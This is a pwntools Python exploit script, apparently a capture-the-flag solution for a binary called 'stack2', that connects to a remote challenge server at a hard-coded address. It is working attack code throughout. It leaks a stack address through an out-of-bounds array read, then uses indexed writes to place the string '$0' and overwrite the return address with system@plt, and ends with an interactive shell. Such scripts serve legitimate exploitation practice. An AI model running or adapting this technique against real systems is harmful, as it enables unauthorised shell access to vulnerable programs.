from pwn import *
context.log_level = "debug"
# p = process("./stack2")
p = remote("111.198.29.45" , 30873)
elf = ELF("./stack2")
# gdb.attach("")
shell = elf.sym["hackhere"]
print(hex(shell))
p.sendlineafter("you have:" , str(0x70))
for i in range(100):
	p.sendline("+")

p.sendlineafter("5. exit\n" , "1")
for i in range(109):
	p.recvline()
text = ""
for i in range(4):
	temp = p.recvline()[:-1]
	temp = int(temp.split("\t\t")[1]) & 0xff
	text += chr(temp)
stack_addr = u32(text)
input_addr = stack_addr + 0x30

str_bin_sh = "$0\x00" 
#edit /bin/sh
for i in range(len(str_bin_sh)):
	p.sendlineafter("5. exit\n" , "3")
	p.sendlineafter("which number to change:\n" , str(0x70 + 0x14 + 4 + 0x30 + i))
	p.sendlineafter("new number:" , str(ord(str_bin_sh[i])))
#edit payload
payload = p32(elf.plt["system"])  + p32(0) + p32(input_addr) 
for i in range(len(payload)):
	p.sendlineafter("5. exit\n" , "3")
	p.sendlineafter("which number to change:\n" , str(0x70 + 0x14 + i))
	p.sendlineafter("new number:" , str(ord(payload[i])))
#edit 
# gdb.attach(p , "b *0x080488EB")
p.sendlineafter("5. exit\n" , "5")

p.interactive()